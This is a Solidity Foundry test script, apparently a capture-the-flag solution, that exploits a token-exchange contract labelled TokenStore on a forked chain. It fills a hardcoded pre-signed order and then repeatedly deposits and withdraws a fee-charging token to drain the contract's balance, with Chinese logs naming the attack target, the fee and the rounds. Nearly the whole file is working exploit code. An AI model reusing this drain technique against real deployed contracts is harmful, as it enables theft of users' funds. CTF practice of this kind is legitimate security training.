// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/Challenge.sol";
import "forge-ctf/CTFDeployment.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {console2} from "forge-std/console2.sol";

interface ITokenStore {
    function deposit() external payable;
    function depositToken(address, uint256) external;
    function withdrawToken(address, uint256) external;
    function trade(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s,
        uint256 _amount
    ) external;

    function availableVolume(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) external view returns (uint256);
    function balanceOf(address _token, address _user) external view returns (uint256);
}


contract Solve is BaseTest {
    IERC20 private immutable TOKEN = IERC20(0xC937f5027D47250Fa2Df8CbF21F6F88E98817845);

    address private immutable TOKENSTORE = 0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8;

    function setUp() public override {
        super.setUp();

        vm.label(address(this), "Solver");
        vm.label(address(TOKEN), "Token");
        vm.label(TOKENSTORE, "TokenStore");
        vm.label(challenge, "Challenge");

        uint256 forkId = vm.createFork(vm.envString("LOCAL_RPC"));
        vm.selectFork(forkId);

        challenge = address(new Challenge());
    } 

    function prepare(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s) 
    internal{
        uint256 amount = ITokenStore(TOKENSTORE).availableVolume(
            _tokenGet,
            _amountGet,
            _tokenGive,
            _amountGive,
            _expires,
            _nonce,
            _user,
            _v,
            _r,
            _s
        );

        ITokenStore(TOKENSTORE).trade(
            _tokenGet,
            _amountGet,
            _tokenGive,
            _amountGive,
            _expires,
            _nonce,
            _user,
            _v,
            _r,
            _s,
            amount);
    }
 
    function test_Expoit() public {
        /* to-do */

        console2.log("--------------------------- after expoit ------------------------");
        uint256 beforeBalance = TOKEN.balanceOf(TOKENSTORE);
        
        emit log_named_decimal_uint('TOKEN.balanceOf(TOKENSTORE)', beforeBalance, 6);
        emit log_named_decimal_uint('TOKEN.balanceOf(player)', TOKEN.balanceOf(player), 6);

        console2.log("--------------------------- prepare work ------------------------");
        vm.startBroadcast(player);

        ITokenStore(TOKENSTORE).deposit{value: 4e16}();

        address _tokenGet = address(0x00);
        uint256 _amountGet = 42468000000000000;
        address _tokenGive = address(TOKEN);
        uint256 _amountGive = 1000000000000;
        uint256 _expires = 109997981;
        uint256 _nonce = 249363390;
        address _user = 0x6FFacaa9A9c6f8e7CD7D1C6830f9bc2a146cF10C;
        uint8 _v = 28;
        bytes32 _r = 0x2b80ada8a8d94ed393723df8d1b802e1f05e623830cf117e326b30b1780ae397;
        bytes32 _s = 0x65397616af0ec4d25f828b25497c697c58b3dcc852259eaf7c72ff487ce76e1e;
        
        prepare(_tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce, _user, _v, _r, _s);
        
        uint256 withdrawAmount = ITokenStore(TOKENSTORE).balanceOf(address(TOKEN), player);
        
        ITokenStore(TOKENSTORE).withdrawToken(address(TOKEN), withdrawAmount);
        uint256 fee = beforeBalance - TOKEN.balanceOf(TOKENSTORE) - withdrawAmount;

        emit log_string(unicode"获取TOKEN");
        emit log_named_decimal_uint('TOKEN.balanceOf(player)', TOKEN.balanceOf(player), 6);
        emit log_named_decimal_uint('Fee per transfer', fee, 6);

        console2.log("--------------------------- exploit work ------------------------");

        uint256 round = (11111e8-fee) / (fee * 4) + 1;
        emit log_named_decimal_uint(unicode'本次攻击的目标金额', 11111e8, 6);
        emit log_named_decimal_uint(unicode'攻击一次的手续费', fee, 6);
        emit log_named_decimal_uint(unicode'攻击轮数', round, 0);

        TOKEN.approve(TOKENSTORE, type(uint256).max);

        for (uint256 i = 0; i < round; i++) {
            ITokenStore(TOKENSTORE).depositToken(address(TOKEN), withdrawAmount);
            ITokenStore(TOKENSTORE).withdrawToken(address(TOKEN), withdrawAmount);
        }
        vm.stopBroadcast();

        console2.log("--------------------------- after exploit ------------------------");
        emit log_named_decimal_uint('TOKENSTORE loss amount of TOKEN', beforeBalance - TOKEN.balanceOf(TOKENSTORE), 6);
        emit log_named_decimal_uint('TOKEN.balanceOf(player)', TOKEN.balanceOf(player), 6);
        
        assert(validation());
    }

    function validation() internal view returns (bool) {
        return Challenge(challenge).isSolved();
    }
}
